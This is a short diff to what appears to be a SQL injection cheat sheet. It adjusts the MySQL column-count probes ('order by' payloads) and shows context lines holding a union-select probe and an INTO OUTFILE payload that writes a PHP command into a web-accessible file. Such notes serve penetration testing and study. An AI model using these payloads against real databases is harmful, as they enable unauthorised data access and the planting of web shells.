@@ -125,8 +125,8 @@ MySQL:
 SELECT '<phpCommand>' INTO OUTFILE '<path>/<file>.php'
 
 # get amount of columns (MySQL):
-foo' order by 3#
-foo' order by 2#
+foo' order by 10#
+foo' order by 9#
 
 # or
 foo' union select null--
